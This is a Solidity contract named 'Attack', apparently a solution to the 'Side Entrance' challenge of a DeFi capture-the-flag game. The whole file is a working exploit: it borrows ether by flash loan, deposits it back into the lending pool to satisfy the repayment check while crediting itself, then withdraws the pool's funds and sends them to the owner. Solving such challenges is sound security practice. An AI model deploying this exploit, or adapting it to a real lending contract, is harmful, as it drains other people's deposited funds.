// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract Attack {

    SideEntranceLenderPool public pool;
    address payable public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }
    
    function getFlash(uint _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
    }
    
    function execute() external payable {
        uint amount = address(this).balance;
        pool.deposit{ value: amount }();
    }
  
    
    receive() external payable {
        (bool s, ) = owner.call{ value: address(this).balance }("");
        require(s);
    }

}